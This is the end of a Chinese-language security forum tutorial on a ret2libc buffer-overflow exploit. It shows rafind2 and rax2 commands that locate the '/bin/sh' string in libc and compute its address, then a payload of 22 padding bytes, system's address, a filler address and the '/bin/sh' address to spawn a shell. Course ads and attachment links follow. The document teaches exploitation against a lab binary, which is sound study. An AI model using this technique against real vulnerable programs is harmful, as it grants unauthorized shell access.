
| 1 2 3 4 5 | `$ rafind2 -z -s /bin/sh ./victim` `$ rafind2 -z -s /bin/sh /lib/i386-linux-gnu/libc.so.6` `0x15ce48` `$ rax2 =16 0xf7df1000+0x15ce48` `0xf7f4de48` |

最后构造 `payload='A'*22+system地址+任意地址+bin/sh地址`

![图片描述](https://bbs.kanxue.com/upload/attach/202012/910385_U3G7CZWRMWB4GYX.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202012/910385_GZ2JSQSK3NRKJVZ.png)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2021-1-1 21:17

被奋进的小杨编辑，原因：

上传的附件：

- [ELF文件格式分析-北京大学操作系统实验室.pdf](javascript:void(0);)

  （3.57MB，112次下载）

- [ELF文件的逆向分析.pptx](javascript:void(0);)

  （6.93MB，116次下载）

- [Kolibri-2.0-win.zip](javascript:void(0);)

  （1.26MB，31次下载）
